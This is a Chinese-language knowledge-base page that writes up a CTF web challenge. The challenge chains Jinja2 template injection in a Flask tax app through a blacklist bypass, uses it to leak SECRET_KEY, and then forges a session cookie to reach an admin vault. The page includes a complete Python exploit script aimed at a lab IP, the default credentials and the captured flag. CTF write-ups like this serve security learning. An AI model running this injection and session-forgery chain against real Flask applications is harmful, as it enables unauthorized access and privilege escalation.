---
title: Flask SSTI + Session 伪造漏洞链
category: web
tags: [ssti, flask, jinja2, session-forgery, itsdangerous, blacklist-bypass, SECRET_KEY]
triggers: [SSTI, flask, jinja2, render_template_string, itsdangerous, session伪造, SECRET_KEY, {{config}}, 黑名单绕过, tax_inspector, custom_footer, AUDIT_PENDING, cookie-session]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/web/Flask_SSTI_session伪造.md, raw/ctf-solutions/WEB-TaxSystem_SSTI/writeup.md]
---

## Summary

Flask 税务系统—`/preview/<id>` 端点通过 `render_template_string()` 渲染用户可控的 `custom_footer` 字段，绕过简单黑名单泄露 `config.SECRET_KEY`，用 `itsdangerous.URLSafeTimedSerializer` 伪造 `tax_inspector` 角色 session 越权访问 `/admin/vault`。

## Key Points

- `render_template_string()` 直接拼接用户输入是 SSTI 根源
- 黑名单 `['__', '[', ']', '|', '\\', '+', "'", '"', 'request', 'session', 'url_for', 'popen', 'system']` 但 `{{config}}` 不在列
- 漏洞链：SSTI → 泄露 SECRET_KEY → 伪造 session → 越权读 flag
- itsdangerous 的 salt 通常是 `"cookie-session"`，key_derivation 为 `"hmac"`

## Step-by-Step

### Step 1: 源码审计 — 定位 SSTI 触发点

关键漏洞链：
1. **`/api/import`** 允许修改 `state` 和 `custom_footer` 字段
2. **`/preview/<int:profile_id>`** 在 `state == 'AUDIT_PENDING'` 时将 `custom_footer` 通过 `render_template_string()` 渲染
3. 黑名单过滤：`['__', '[', ']', '|', '\\', '+', "'", '"', 'request', 'session', 'url_for', 'popen', 'system']`

### Step 2: SSTI 验证 → 泄露 SECRET_KEY

用 admin/123456 登录 → 创建 profile → 修改 state 为 `AUDIT_PENDING`，注入 `{{7*7}}` 验证 SSTI（返回 49），再注入 `{{config}}` 提取 SECRET_KEY。

### Step 3: Session 伪造

```python
from itsdangerous import URLSafeTimedSerializer
serializer = URLSafeTimedSerializer(
    secret_key, 
    salt="cookie-session",
    signer_kwargs={"key_derivation": "hmac"}
)
forged = serializer.dumps({"user_id": 1, "role": "tax_inspector"})
```

携带伪造 cookie 访问 `/admin/vault` 获取 `flag{...}`。

## Full Exploit

```python
import requests, re
from itsdangerous import URLSafeTimedSerializer

TARGET = "http://120.27.146.76:22375"
s = requests.Session()

# 1. Login
s.post(f"{TARGET}/login", data={"username":"admin","password":"123456"})

# 2. Create profile
s.post(f"{TARGET}/api/create_profile")

# 3. SSTI probe
s.post(f"{TARGET}/api/import", json={
    "profile_id":1, "data":{"state":"AUDIT_PENDING","custom_footer":"{{7*7}}"}
})
r = s.get(f"{TARGET}/preview/1")
assert "49" in r.text

# 4. Leak SECRET_KEY
s.post(f"{TARGET}/api/import", json={
    "profile_id":1, "data":{"state":"AUDIT_PENDING","custom_footer":"{{config}}"}
})
r = s.get(f"{TARGET}/preview/1")
key = re.search(r"SECRET_KEY.*?([a-zA-Z0-9_]{15,60})", r.text).group(1)

# 5. Forge session
serializer = URLSafeTimedSerializer(
    key, salt="cookie-session", signer_kwargs={"key_derivation":"hmac"}
)
forged = serializer.dumps({"user_id":1, "role":"tax_inspector"})

# 6. Get flag
r = requests.get(f"{TARGET}/admin/vault", cookies={"session":forged})
flag = re.search(r'flag\{[^}]+\}', r.text).group(0)
print(flag)
```

Flag: `flag{9e4bec648f840152b7e868c28f5243eb}`

## Connections
- Related: [[template-injection-general]] (future page)
- Related: [[just-proto]] (原型污染 + 命令注入类似链)
- GHSA: [[web/ghsa-rce-overview]] (模板注入 → RCE)
- Source: [[raw/ctf-solutions/WEB-TaxSystem_SSTI/writeup]]
